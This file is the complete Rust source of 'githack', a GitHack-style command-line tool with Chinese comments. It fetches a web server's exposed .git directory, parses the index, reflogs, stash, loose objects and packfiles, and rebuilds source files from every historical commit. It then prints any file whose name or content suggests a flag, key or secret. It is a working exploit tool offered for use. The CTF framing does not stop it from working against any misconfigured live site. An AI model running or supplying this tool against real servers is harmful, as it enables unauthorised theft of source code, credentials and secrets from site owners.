//! githack - .git 泄露利用 (GitHack 风格): 恢复全部历史提交的源码 + flag 扫描
//! 纯 Rust: index/logs/HEAD/stash 解析 + loose/pack git 对象读取(zlib 用 flate2), 不调用 git 命令

use clap::Parser;
use colored::Colorize;
use common::http::{HttpClient, HttpOpts};
use common::{exit, finish, scan_flags, Mode, Out};
use flate2::read::ZlibDecoder;
use serde::Serialize;
use std::collections::btree_map::Entry as BTreeEntry;
use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
use std::io::{IsTerminal, Read};
use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::sync::OnceLock;

#[derive(Parser, Debug)]
#[command(
    name = "githack",
    version,
    about = ".git 泄露利用 (GitHack 风格): 恢复全历史源码 + flag 扫描",
    long_about = "githack -- BugScanTeam GitHack 的 Rust 重写（纯 Rust 解析 git 对象, 不调用 git 命令）\n\n用法:\n  githack <URL>                     恢复 .git 泄露, 自动 cat 出 flag* 文件\n  githack <URL> --out 目录          指定输出目录（默认 githack_<host>/）\n  githack <URL> --cat 相对路径      恢复后直接打印指定文件内容\n\n示例:\n  githack http://目标/.git\n  githack http://目标/ --out restore\n  githack http://目标/ --cat .git/index\n\n退出码: 0=命中 1=无结果 2=用法错误 3=运行错误",
    after_help = "退出码: 0=命中 1=无结果 2=用法错误 3=运行错误",
    arg_required_else_help = true
)]
struct Args {
    /// 目标 URL
    #[arg(value_name = "URL")]
    url: String,

    /// 输出目录（默认 githack_<host>/）
    #[arg(long, value_name = "目录")]
    out: Option<String>,

    /// 恢复后直接打印指定文件内容
    #[arg(long, value_name = "相对路径")]
    cat: Option<String>,

    /// 静默模式（只输出 flag 与 --cat 内容）
    #[arg(short, long)]
    quiet: bool,

    /// HTTP 超时(秒)
    #[arg(long, default_value_t = 10, value_name = "SECS")]
    timeout: u64,

    /// HTTP 代理
    #[arg(long, value_name = "URL")]
    proxy: Option<String>,

    /// 跳过 TLS 证书校验
    #[arg(long)]
    insecure: bool,

    /// 自定义 User-Agent
    #[arg(long, value_name = "UA")]
    ua: Option<String>,

    /// Cookie
    #[arg(long, value_name = "COOKIE")]
    cookie: Option<String>,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum ObjKind {
    Commit,
    Tree,
    Blob,
    Tag,
}

#[derive(Serialize, Clone)]
struct CommitInfo {
    sha: String,
    short: String,
    message: String,
    stash: bool,
}

#[derive(Serialize, Clone)]
struct FileInfo {
    path: String,
    blob: String,
    source: String,
}

#[derive(Serialize)]
struct Report {
    tool: &'static str,
    target: String,
    out: String,
    index_entries: usize,
    index_blobs: usize,
    log_commits: usize,
    stash_records: usize,
    objects_downloaded: usize,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    packs: Vec<String>,
    commits: Vec<CommitInfo>,
    files: Vec<FileInfo>,
    written: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    flags: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    flag_files: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    cat: Option<String>,
}

fn empty_report(target: &str, out: &str) -> Report {
    Report {
        tool: "githack",
        target: target.to_string(),
        out: out.to_string(),
        index_entries: 0,
        index_blobs: 0,
        log_commits: 0,
        stash_records: 0,
        objects_downloaded: 0,
        packs: Vec::new(),
        commits: Vec::new(),
        files: Vec::new(),
        written: Vec::new(),
        flags: Vec::new(),
        flag_files: Vec::new(),
        cat: None,
    }
}

fn tag_info() -> String {
    "[*]".cyan().bold().to_string()
}

fn tag_ok() -> String {
    "[+]".green().bold().to_string()
}

fn tag_warn() -> String {
    "[!]".yellow().bold().to_string()
}

/// 旧版兼容: url.rstrip('/'); 不以 .git 结尾则补 /.git; 末尾补 /
fn normalize_url(url: &str) -> String {
    let mut s = url.trim_end_matches('/').to_string();
    if !s.ends_with(".git") {
        s.push_str("/.git");
    }
    s.push('/');
    s
}

/// 旧版兼容: githack_<host>（scheme 去掉, / 与 : 换成 _）
fn default_out_dir(url: &str) -> String {
    let host = url
        .trim_end_matches('/')
        .replace("https://", "")
        .replace("http://", "")
        .replace(['/', ':'], "_");
    format!("githack_{host}")
}

fn is_hex40(s: &str) -> bool {
    s.len() == 40 && s.bytes().all(|b| b.is_ascii_hexdigit())
}

fn hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

fn hex20(s: &str) -> Option<[u8; 20]> {
    if !is_hex40(s) {
        return None;
    }
    let mut out = [0u8; 20];
    for i in 0..20 {
        out[i] = u8::from_str_radix(&s[i * 2..i * 2 + 2], 16).ok()?;
    }
    Some(out)
}

fn be32(b: &[u8]) -> u32 {
    u32::from_be_bytes([b[0], b[1], b[2], b[3]])
}

fn be64(b: &[u8]) -> u64 {
    u64::from_be_bytes([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]])
}

fn encode_url(url: &str) -> String {
    let Some(scheme_end) = url.find("://") else {
        return url.to_string();
    };
    let rest = &url[scheme_end + 3..];
    let path_start = rest
        .find('/')
        .map(|i| scheme_end + 3 + i)
        .unwrap_or(url.len());
    let (base, path) = url.split_at(path_start);
    let mut out = String::with_capacity(url.len());
    out.push_str(base);
    for &b in path.as_bytes() {
        let keep = b.is_ascii_alphanumeric()
            || matches!(
                b,
                b'-' | b'.'
                    | b'_'
                    | b'~'
                    | b'/'
                    | b'%'
                    | b'!'
                    | b'$'
                    | b'&'
                    | b'\''
                    | b'('
                    | b')'
                    | b'*'
                    | b'+'
                    | b','
                    | b';'
                    | b'='
                    | b':'
                    | b'@'
            );
        if keep {
            out.push(b as char);
        } else {
            out.push_str(&format!("%{b:02X}"));
        }
    }
    out
}

fn fetch(client: &HttpClient, url: &str) -> Option<Vec<u8>> {
    let encoded = encode_url(url);
    match client.get(&encoded) {
        Ok(r) if r.is_success() && !r.body.is_empty() => Some(r.body),
        _ => None,
    }
}

fn zlib_decompress(data: &[u8]) -> Option<Vec<u8>> {
    let mut dec = ZlibDecoder::new(data);
    let mut out = Vec::new();
    dec.read_to_end(&mut out).ok()?;
    Some(out)
}

fn parse_loose(data: &[u8]) -> Option<(ObjKind, Vec<u8>)> {
    let raw = zlib_decompress(data)?;
    let nul = raw.iter().position(|&b| b == 0)?;
    let hdr = std::str::from_utf8(&raw[..nul]).ok()?;
    let mut parts = hdr.splitn(2, ' ');
    let kind = match parts.next()? {
        "commit" => ObjKind::Commit,
        "tree" => ObjKind::Tree,
        "blob" => ObjKind::Blob,
        "tag" => ObjKind::Tag,
        _ => return None,
    };
    let size: usize = parts.next()?.parse().ok()?;
    let body = raw[nul + 1..].to_vec();
    if body.len() != size {
        return None;
    }
    Some((kind, body))
}

fn read_varint(data: &[u8], pos: &mut usize) -> Option<u64> {
    let mut v = 0u64;
    let mut shift = 0u32;
    loop {
        let c = *data.get(*pos)?;
        *pos += 1;
        v |= ((c & 0x7f) as u64) << shift;
        shift += 7;
        if c & 0x80 == 0 {
            return Some(v);
        }
        if shift > 63 {
            return None;
        }
    }
}

fn parse_index(data: &[u8]) -> Option<(usize, Vec<(String, String)>)> {
    if data.len() < 12 || &data[..4] != b"DIRC" {
        return None;
    }
    let version = be32(&data[4..8]);
    let count = be32(&data[8..12]) as usize;
    let mut pos = 12usize;
    let mut out = Vec::new();
    let mut prev: Vec<u8> = Vec::new();
    for _ in 0..count {
        if pos + 62 > data.len() {
            break;
        }
        let e = &data[pos..pos + 62];
        let sha = hex(&e[40..60]);
        let flags = u16::from_be_bytes([e[60], e[61]]);
        let mut plen = (flags & 0x0FFF) as usize;
        let extended = flags & 0x4000 != 0;
        pos += 62;
        if version >= 3 && extended {
            if pos + 2 > data.len() {
                break;
            }
            pos += 2;
        }
        if version >= 4 {
            let strip = match read_varint(data, &mut pos) {
                Some(v) => v,
                None => break,
            };
            let Some(nul) = data[pos..].iter().position(|&b| b == 0) else {
                break;
            };
            let suffix = &data[pos..pos + nul];
            pos += nul + 1;
            let keep = prev.len().saturating_sub(strip as usize);
            let mut path = prev[..keep].to_vec();
            path.extend_from_slice(suffix);
            prev = path.clone();
            out.push((String::from_utf8_lossy(&path).to_string(), sha));
        } else {
            if plen == 0x0FFF {
                let nul = data[pos..].iter().position(|&b| b == 0)?;
                plen = nul;
            }
            if pos + plen > data.len() {
                break;
            }
            let path = data[pos..pos + plen].to_vec();
            pos += plen;
            prev = path.clone();
            out.push((String::from_utf8_lossy(&path).to_string(), sha));
            let rem = (pos - 12) % 8;
            if rem != 0 {
                pos += 8 - rem;
            }
        }
    }
    Some((count, out))
}

fn parse_log(text: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for line in text.lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 2 && is_hex40(parts[1]) {
            let msg = if parts.len() > 6 {
                parts[6..].join(" ")
            } else {
                String::new()
            };
            out.push((parts[1].to_string(), msg));
        }
    }
    out
}

fn packed_ref_lookup(text: &str, reference: &str) -> Option<String> {
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with('^') {
            continue;
        }
        let mut parts = line.split_whitespace();
        let sha = parts.next()?;
        let name = parts.next()?;
        if name == reference && is_hex40(sha) {
            return Some(sha.to_string());
        }
    }
    None
}

fn parse_commit(body: &[u8]) -> (Option<String>, Vec<String>) {
    static RE: OnceLock<regex::Regex> = OnceLock::new();
    let re = RE.get_or_init(|| {
        regex::Regex::new(r"(?m)^(parent|tree) ([0-9a-f]{40})").expect("commit regex")
    });
    let text = String::from_utf8_lossy(body);
    let mut tree = None;
    let mut parents = Vec::new();
    for cap in re.captures_iter(&text) {
        if &cap[1] == "tree" {
            if tree.is_none() {
                tree = Some(cap[2].to_string());
            }
        } else {
            parents.push(cap[2].to_string());
        }
    }
    (tree, parents)
}

struct TreeEntry {
    name: String,
    sha: String,
    mode: String,
}

impl TreeEntry {
    fn is_dir(&self) -> bool {
        self.mode == "40000" || self.mode == "040000"
    }
    fn is_gitlink(&self) -> bool {
        self.mode == "160000"
    }
}

fn parse_tree(body: &[u8]) -> Vec<TreeEntry> {
    let mut out = Vec::new();
    let mut pos = 0usize;
    while pos < body.len() {
        let Some(sp) = body[pos..].iter().position(|&b| b == b' ') else {
            break;
        };
        let mode = String::from_utf8_lossy(&body[pos..pos + sp]).to_string();
        pos += sp + 1;
        let Some(nul) = body[pos..].iter().position(|&b| b == 0) else {
            break;
        };
        let name = String::from_utf8_lossy(&body[pos..pos + nul]).to_string();
        pos += nul + 1;
        if pos + 20 > body.len() {
            break;
        }
        let sha = hex(&body[pos..pos + 20]);
        pos += 20;
        out.push(TreeEntry { name, sha, mode });
    }
    out
}

fn safe_join(base: &Path, rel: &str) -> Option<PathBuf> {
    let mut p = PathBuf::new();
    for comp in rel.split('/') {
        if comp.is_empty() || comp == "." || comp == ".." {
            return None;
        }
        p.push(comp);
    }
    if p.as_os_str().is_empty() {
        None
    } else {
        Some(base.join(p))
    }
}

fn write_out(base: &Path, rel: &str, data: &[u8]) -> bool {
    let Some(dest) = safe_join(base, rel) else {
        return false;
    };
    if let Some(parent) = dest.parent() {
        if std::fs::create_dir_all(parent).is_err() {
            return false;
        }
    }
    std::fs::write(dest, data).is_ok()
}

fn parse_pack_idx(data: &[u8]) -> Option<HashMap<[u8; 20], u64>> {
    if data.len() < 8 + 256 * 4 {
        return None;
    }
    if &data[..4] == b"\xfftOc" {
        if be32(&data[4..8]) != 2 {
            return None;
        }
        let n = be32(&data[8 + 255 * 4..8 + 256 * 4]) as usize;
        let mut p = 8 + 256 * 4;
        let shas = data.get(p..p + n * 20)?;
        p += n * 20;
        p += n * 4;
        let offs = data.get(p..p + n * 4)?;
        p += n * 4;
        let large = &data[p..];
        let mut map = HashMap::with_capacity(n);
        for i in 0..n {
            let o = be32(&offs[i * 4..i * 4 + 4]) as u64;
            let off = if o & 0x8000_0000 != 0 {
                let idx = (o & 0x7fff_ffff) as usize;
                be64(large.get(idx * 8..idx * 8 + 8)?)
            } else {
                o
            };
            let sha: [u8; 20] = shas[i * 20..i * 20 + 20].try_into().ok()?;
            map.insert(sha, off);
        }
        Some(map)
    } else {
        let n = be32(&data[255 * 4..256 * 4]) as usize;
        let mut p = 256 * 4;
        let mut map = HashMap::with_capacity(n);
        for _ in 0..n {
            let off = be32(data.get(p..p + 4)?) as u64;
            let sha: [u8; 20] = data.get(p + 4..p + 24)?.try_into().ok()?;
            map.insert(sha, off);
            p += 24;
        }
        Some(map)
    }
}

fn read_obj_header(data: &[u8], pos: &mut usize) -> Option<(u8, u64)> {
    let mut c = *data.get(*pos)?;
    *pos += 1;
    let ty = (c >> 4) & 7;
    let mut size = (c & 15) as u64;
    let mut shift = 4u32;
    while c & 0x80 != 0 {
        c = *data.get(*pos)?;
        *pos += 1;
        size |= ((c & 0x7f) as u64) << shift;
        shift += 7;
        if shift > 63 {
            return None;
        }
    }
    Some((ty, size))
}

fn read_ofs_delta(data: &[u8], pos: &mut usize) -> Option<u64> {
    let mut c = *data.get(*pos)?;
    *pos += 1;
    let mut ofs = (c & 0x7f) as u64;
    while c & 0x80 != 0 {
        c = *data.get(*pos)?;
        *pos += 1;
        ofs = ((ofs + 1) << 7) | (c & 0x7f) as u64;
    }
    Some(ofs)
}

fn apply_delta(base: &[u8], delta: &[u8]) -> Option<Vec<u8>> {
    let mut p = 0usize;
    let src_size = read_varint(delta, &mut p)?;
    let dst_size = read_varint(delta, &mut p)?;
    if src_size as usize != base.len() {
        return None;
    }
    let mut out = Vec::with_capacity(dst_size as usize);
    while p < delta.len() {
        let op = delta[p];
        p += 1;
        if op & 0x80 != 0 {
            let mut cp_off = 0usize;
            let mut cp_size = 0usize;
            for i in 0..4 {
                if op & (1 << i) != 0 {
                    cp_off |= (*delta.get(p)? as usize) << (i * 8);
                    p += 1;
                }
            }
            for i in 0..3 {
                if op & (1 << (4 + i)) != 0 {
                    cp_size |= (*delta.get(p)? as usize) << (i * 8);
                    p += 1;
                }
            }
            if cp_size == 0 {
                cp_size = 0x10000;
            }
            if cp_off + cp_size > base.len() {
                return None;
            }
            out.extend_from_slice(&base[cp_off..cp_off + cp_size]);
        } else if op != 0 {
            let n = op as usize;
            out.extend_from_slice(delta.get(p..p + n)?);
            p += n;
        } else {
            return None;
        }
    }
    if out.len() != dst_size as usize {
        return None;
    }
    Some(out)
}

fn pack_read(
    data: &[u8],
    offset: u64,
    idx: &HashMap<[u8; 20], u64>,
    cache: &mut HashMap<u64, (ObjKind, Vec<u8>)>,
) -> Option<(ObjKind, Vec<u8>)> {
    pack_read_depth(data, offset, idx, cache, 0)
}

fn pack_read_depth(
    data: &[u8],
    offset: u64,
    idx: &HashMap<[u8; 20], u64>,
    cache: &mut HashMap<u64, (ObjKind, Vec<u8>)>,
    depth: usize,
) -> Option<(ObjKind, Vec<u8>)> {
    if depth > 200 {
        return None;
    }
    if let Some(v) = cache.get(&offset) {
        return Some(v.clone());
    }
    let off = usize::try_from(offset).ok()?;
    if off >= data.len() {
        return None;
    }
    let mut p = off;
    let (ty, size) = read_obj_header(data, &mut p)?;
    let result = match ty {
        1..=4 => {
            let kind = match ty {
                1 => ObjKind::Commit,
                2 => ObjKind::Tree,
                3 => ObjKind::Blob,
                _ => ObjKind::Tag,
            };
            let body = zlib_decompress(&data[p..])?;
            if body.len() != size as usize {
                return None;
            }
            (kind, body)
        }
        6 => {
            let base_off = read_ofs_delta(data, &mut p)?;
            let base_offset = offset.checked_sub(base_off)?;
            let (base_kind, base) = pack_read_depth(data, base_offset, idx, cache, depth + 1)?;
            let delta = zlib_decompress(&data[p..])?;
            if delta.len() != size as usize {
                return None;
            }
            (base_kind, apply_delta(&base, &delta)?)
        }
        7 => {
            if p + 20 > data.len() {
                return None;
            }
            let mut sha = [0u8; 20];
            sha.copy_from_slice(&data[p..p + 20]);
            p += 20;
            let base_off = *idx.get(&sha)?;
            let (base_kind, base) = pack_read_depth(data, base_off, idx, cache, depth + 1)?;
            let delta = zlib_decompress(&data[p..])?;
            if delta.len() != size as usize {
                return None;
            }
            (base_kind, apply_delta(&base, &delta)?)
        }
        _ => return None,
    };
    cache.insert(offset, result.clone());
    Some(result)
}

struct Pack {
    name: String,
    idx: HashMap<[u8; 20], u64>,
    pack_path: PathBuf,
    data: Option<Vec<u8>>,
    cache: HashMap<u64, (ObjKind, Vec<u8>)>,
}

struct GitStore<'a> {
    client: &'a HttpClient,
    url: String,
    objects_dir: PathBuf,
    packs: Vec<Pack>,
    packs_loaded: bool,
}

impl<'a> GitStore<'a> {
    fn new(client: &'a HttpClient, url: String, objects_dir: PathBuf) -> Self {
        GitStore {
            client,
            url,
            objects_dir,
            packs: Vec::new(),
            packs_loaded: false,
        }
    }

    fn ensure_packs(&mut self) {
        if self.packs_loaded {
            return;
        }
        self.packs_loaded = true;
        let Some(info) = fetch(self.client, &format!("{}objects/info/packs", self.url)) else {
            return;
        };
        let text = String::from_utf8_lossy(&info).to_string();
        for line in text.lines() {
            let line = line.trim();
            if line.is_empty() {
                continue;
            }
            let name = line.strip_prefix("P ").map(str::trim).unwrap_or(line);
            if !name.ends_with(".pack") {
                continue;
            }
            let base = &name[..name.len() - 5];
            let idx_name = format!("{base}.idx");
            let Some(idx_data) =
                fetch(self.client, &format!("{}objects/pack/{idx_name}", self.url))
            else {
                continue;
            };
            let Some(idx) = parse_pack_idx(&idx_data) else {
                continue;
            };
            let pack_dir = self.objects_dir.join("pack");
            let _ = std::fs::create_dir_all(&pack_dir);
            let _ = std::fs::write(pack_dir.join(&idx_name), &idx_data);
            self.packs.push(Pack {
                name: name.to_string(),
                idx,
                pack_path: pack_dir.join(name),
                data: None,
                cache: HashMap::new(),
            });
        }
    }

    fn pack_names(&self) -> Vec<String> {
        self.packs.iter().map(|p| p.name.clone()).collect()
    }

    fn pack_has(&mut self, sha: &str) -> bool {
        self.ensure_packs();
        let Some(key) = hex20(sha) else {
            return false;
        };
        self.packs.iter().any(|p| p.idx.contains_key(&key))
    }

    fn read_packed(&mut self, sha: &str) -> Option<(ObjKind, Vec<u8>)> {
        self.ensure_packs();
        let key = hex20(sha)?;
        for i in 0..self.packs.len() {
            let Some(&off) = self.packs[i].idx.get(&key) else {
                continue;
            };
            if self.packs[i].data.is_none() {
                let url = format!("{}objects/pack/{}", self.url, self.packs[i].name);
                let Some(d) = fetch(self.client, &url) else {
                    continue;
                };
                if !d.starts_with(b"PACK") {
                    continue;
                }
                let _ = std::fs::write(&self.packs[i].pack_path, &d);
                self.packs[i].data = Some(d);
            }
            let pack = &mut self.packs[i];
            let Some(data) = pack.data.as_ref() else {
                continue;
            };
            if let Some(obj) = pack_read(data, off, &pack.idx, &mut pack.cache) {
                return Some(obj);
            }
        }
        None
    }

    fn loose_path(&self, sha: &str) -> PathBuf {
        self.objects_dir.join(&sha[..2]).join(&sha[2..])
    }

    fn read_loose(&self, sha: &str) -> Option<(ObjKind, Vec<u8>)> {
        let data = std::fs::read(self.loose_path(sha)).ok()?;
        parse_loose(&data)
    }

    fn fetch_loose(&mut self, sha: &str) -> bool {
        let url = format!("{}objects/{}/{}", self.url, &sha[..2], &sha[2..]);
        let Some(data) = fetch(self.client, &url) else {
            return false;
        };
        if parse_loose(&data).is_none() {
            return false;
        }
        let path = self.loose_path(sha);
        if let Some(parent) = path.parent() {
            if std::fs::create_dir_all(parent).is_err() {
                return false;
            }
        }
        std::fs::write(&path, &data).is_ok()
    }

    fn read_object(&mut self, sha: &str) -> Option<(ObjKind, Vec<u8>)> {
        if !is_hex40(sha) {
            return None;
        }
        if let Some(o) = self.read_loose(sha) {
            return Some(o);
        }
        if self.pack_has(sha) {
            if let Some(o) = self.read_packed(sha) {
                return Some(o);
            }
        }
        if self.fetch_loose(sha) {
            return self.read_loose(sha);
        }
        self.read_packed(sha)
    }
}

fn resolve_tree(store: &mut GitStore, root: &str) -> BTreeMap<String, String> {
    let mut files = BTreeMap::new();
    let mut stack = vec![(root.to_string(), String::new(), 0usize)];
    while let Some((sha, prefix, depth)) = stack.pop() {
        if depth > 64 {
            continue;
        }
        let Some((kind, body)) = store.read_object(&sha) else {
            continue;
        };
        if kind != ObjKind::Tree {
            continue;
        }
        for e in parse_tree(&body) {
            let full = format!("{prefix}{}", e.name);
            if e.is_dir() {
                stack.push((e.sha.clone(), format!("{full}/"), depth + 1));
            } else if !e.is_gitlink() {
                files.insert(full, e.sha);
            }
        }
    }
    files
}

fn run(args: &Args, url: &str, out_dir: &str, client: &HttpClient, out: &Out) -> (Report, u8) {
    let quiet = args.quiet;
    let log = |msg: &str| {
        if !quiet {
            out.info(msg);
        }
    };

    let objects_dir = Path::new(out_dir).join(".git").join("objects");
    if let Err(e) = std::fs::create_dir_all(&objects_dir) {
        out.error(&format!("创建输出目录失败: {e}"));
        return (empty_report(url, out_dir), exit::ERROR);
    }
    let mut store = GitStore::new(client, url.to_string(), objects_dir);

    log(&format!("{} 目标: {}", tag_info(), url.bold()));

    // ---- 步骤 1: index ----
    let mut index_entries = 0usize;
    let mut index_blobs: BTreeSet<String> = BTreeSet::new();
    match fetch(client, &format!("{url}index")) {
        Some(idx) => match parse_index(&idx) {
            Some((count, entries)) => {
                index_entries = count;
                for (_, sha) in entries {
                    index_blobs.insert(sha);
                }
                log(&format!(
                    "{} index: {count} 条目, {} 对象",
                    tag_info(),
                    index_blobs.len()
                ));
            }
            None => log(&format!("{} index 不可用", tag_warn())),
        },
        None => log(&format!("{} index 不可用", tag_warn())),
    }

    // ---- 步骤 2: logs/HEAD + stash ----
    let mut commits: Vec<CommitInfo> = Vec::new();
    let mut log_commits = 0usize;
    if let Some(log_data) = fetch(client, &format!("{url}logs/HEAD")) {
        for (sha, msg) in parse_log(&String::from_utf8_lossy(&log_data)) {
            commits.push(CommitInfo {
                short: sha[..7].to_string(),
                sha,
                message: msg,
                stash: false,
            });
        }
        log_commits = commits.len();
        log(&format!("{} 日志: {log_commits} 次提交", tag_info()));
    }

    let mut stash_records = 0usize;
    if let Some(refs) = fetch(client, &format!("{url}refs/stash")) {
        let s = String::from_utf8_lossy(&refs).trim().to_string();
        if is_hex40(&s) {
            commits.push(CommitInfo {
                short: s[..7].to_string(),
                sha: s,
                message: "stash: (refs/stash)".to_string(),
                stash: true,
            });
            stash_records += 1;
        }
    }
    if let Some(log_data) = fetch(client, &format!("{url}logs/refs/stash")) {
        for (sha, msg) in parse_log(&String::from_utf8_lossy(&log_data)) {
            commits.push(CommitInfo {
                short: sha[..7].to_string(),
                sha,
                message: format!("stash: {msg}"),
                stash: true,
            });
            stash_records += 1;
        }
    }
    if stash_records > 0 {
        log(&format!("{} stash: {stash_records} 条", tag_info()));
    }

    // 无日志时从 HEAD ref 获取
    if commits.is_empty() {
        if let Some(head) = fetch(client, &format!("{url}HEAD")) {
            let h = String::from_utf8_lossy(&head).trim().to_string();
            let sha = if let Some(r) = h.strip_prefix("ref:") {
                let r = r.trim();
                let direct = fetch(client, &format!("{url}{r}")).and_then(|d| {
                    let s = String::from_utf8_lossy(&d).trim().to_string();
                    is_hex40(&s).then_some(s)
                });
                direct.or_else(|| {
                    fetch(client, &format!("{url}packed-refs"))
                        .and_then(|d| packed_ref_lookup(&String::from_utf8_lossy(&d), r))
                })
            } else if is_hex40(&h) {
                Some(h)
            } else {
                None
            };
            if let Some(s) = sha {
                commits.push(CommitInfo {
                    short: s[..7].to_string(),
                    sha: s,
                    message: "HEAD".to_string(),
                    stash: false,
                });
            }
        }
    }

    // ---- 步骤 3: BFS 下载对象 ----
    let mut seen: HashSet<String> = HashSet::new();
    let mut stack: Vec<String> = commits.iter().map(|c| c.sha.clone()).collect();
    for b in &index_blobs {
        if !seen.contains(b) {
            stack.push(b.clone());
        }
    }
    let mut objects_available = 0usize;
    while let Some(sha) = stack.pop() {
        if !seen.insert(sha.clone()) {
            continue;
        }
        let Some((kind, body)) = store.read_object(&sha) else {
            continue;
        };
        objects_available += 1;
        match kind {
            ObjKind::Commit => {
                let (tree, parents) = parse_commit(&body);
                if let Some(t) = tree {
                    stack.push(t);
                }
                stack.extend(parents);
            }
            ObjKind::Tree => {
                for e in parse_tree(&body) {
                    if !e.is_dir() {
                        index_blobs.insert(e.sha.clone());
                    }
                    stack.push(e.sha.clone());
                }
            }
            _ => {}
        }
    }
    let missing: Vec<String> = index_blobs
        .iter()
        .filter(|b| !seen.contains(*b))
        .cloned()
        .collect();
    for b in &missing {
        if store.read_object(b).is_some() {
            seen.insert(b.clone());
            objects_available += 1;
        }
    }
    log(&format!("{} 下载对象: {objects_available}", tag_info()));

    // ---- 步骤 4: 按 commit 恢复文件 ----
    let mut all_files: BTreeMap<String, (String, String)> = BTreeMap::new();
    for c in &commits {
        let Some((kind, body)) = store.read_object(&c.sha) else {
            continue;
        };
        if kind != ObjKind::Commit {
            continue;
        }
        let (tree, _) = parse_commit(&body);
        let Some(tree) = tree else {
            continue;
        };
        let files = resolve_tree(&mut store, &tree);
        for (name, sha) in files {
            match all_files.entry(name) {
                BTreeEntry::Vacant(e) => {
                    e.insert((sha, c.message.clone()));
                }
                BTreeEntry::Occupied(mut e) => {
                    if c.message.starts_with("stash:") {
                        e.insert((sha, c.message.clone()));
                    }
                }
            }
        }
    }
    log(&format!("{} 恢复文件: {} 个", tag_ok(), all_files.len()));

    let mut written: Vec<String> = Vec::new();
    let mut file_infos: Vec<FileInfo> = Vec::new();
    let mut written_data: Vec<(String, Vec<u8>)> = Vec::new();
    for (name, (sha, msg)) in &all_files {
        let Some((kind, data)) = store.read_object(sha) else {
            continue;
        };
        if kind != ObjKind::Blob {
            continue;
        }
        if write_out(Path::new(out_dir), name, &data) {
            written.push(name.clone());
            file_infos.push(FileInfo {
                path: name.clone(),
                blob: sha.clone(),
                source: msg.clone(),
            });
            written_data.push((name.clone(), data));
        }
    }
    log(&format!(
        "{} 写出文件: {} 个 -> {out_dir}/",
        tag_ok(),
        written.len()
    ));

    // ---- 步骤 5: 提交历史 + 文件清单 ----
    log("");
    log(&format!("{} 提交历史:", tag_ok()));
    for c in &commits {
        log(&format!("    {}  {}", c.short, c.message));
    }
    if commits.is_empty() {
        log("    (无日志)");
    }

    log("");
    log(&format!("{} 恢复文件清单:", tag_ok()));
    for (name, (sha, _)) in &all_files {
        log(&format!("    {name}  ({})", &sha[..7]));
    }

    // ---- 步骤 6: 自动 cat flag（旧版兼容: 文件名或内容前 200 行命中） ----
    static NAME_RE: OnceLock<regex::Regex> = OnceLock::new();
    let name_re =
        NAME_RE.get_or_init(|| regex::Regex::new(r"(?i)flag|key|secret|ctf").expect("name regex"));
    let mut flag_files: Vec<String> = Vec::new();
    let mut shown: HashSet<String> = HashSet::new();
    for name in all_files.keys() {
        let mut hit = name_re.is_match(name);
        let content = safe_join(Path::new(out_dir), name).and_then(|p| std::fs::read(p).ok());
        if !hit {
            if let Some(c) = &content {
                let text = String::from_utf8_lossy(c);
                hit = text
                    .lines()
                    .take(200)
                    .any(|l| l.to_lowercase().contains("flag") || l.contains("ctfhub{"));
            }
        }
        if hit && shown.insert(name.clone()) {
            flag_files.push(name.clone());
            if !out.json() {
                println!("\n[FLAG] {name}:");
                if let Some(c) = &content {
                    if !c.is_empty() {
                        println!("{}", String::from_utf8_lossy(c).trim());
                    }
                }
            }
        }
    }

    let mut flags: Vec<String> = Vec::new();
    for (_, data) in &written_data {
        flags.extend(scan_flags(data));
    }
    flags.sort();
    flags.dedup();

    // ---- --cat ----
    let cat = args.cat.as_ref().and_then(|rel| {
        let p = safe_join(Path::new(out_dir), rel)?;
        std::fs::read(p)
            .ok()
            .map(|c| String::from_utf8_lossy(&c).trim().to_string())
    });
    if let Some(want) = &args.cat {
        match &cat {
            Some(c) => {
                if !out.json() {
                    println!("{c}");
                }
            }
            None => eprintln!("[!] 文件不存在: {want}"),
        }
    }

    let cat_missing = args.cat.is_some() && cat.is_none();
    let code = if cat_missing || (objects_available == 0 && written.is_empty()) {
        exit::NO_RESULT
    } else {
        exit::OK
    };

    let report = Report {
        tool: "githack",
        target: url.to_string(),
        out: out_dir.to_string(),
        index_entries,
        index_blobs: index_blobs.len(),
        log_commits,
        stash_records,
        objects_downloaded: objects_available,
        packs: store.pack_names(),
        commits,
        files: file_infos,
        written,
        flags,
        flag_files,
        cat,
    };
    (report, code)
}

fn main() -> ExitCode {
    common::reset_sigpipe();
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    if !std::io::stdout().is_terminal() {
        colored::control::set_override(false);
    }

    let url = normalize_url(&args.url);
    let out_dir = args
        .out
        .clone()
        .unwrap_or_else(|| default_out_dir(&args.url));

    let opts = HttpOpts {
        timeout: args.timeout,
        proxy: args.proxy.clone(),
        insecure: args.insecure,
        user_agent: args.ua.clone().unwrap_or_else(|| "Mozilla/5.0".to_string()),
        cookie: args.cookie.clone(),
        ..HttpOpts::default()
    };
    let client = match HttpClient::new(&opts) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("HTTP 初始化失败: {e}"));
            return finish(exit::ERROR);
        }
    };

    let (report, code) = run(&args, &url, &out_dir, &client, &out);
    out.emit(|| {}, &report);
    finish(code)
}
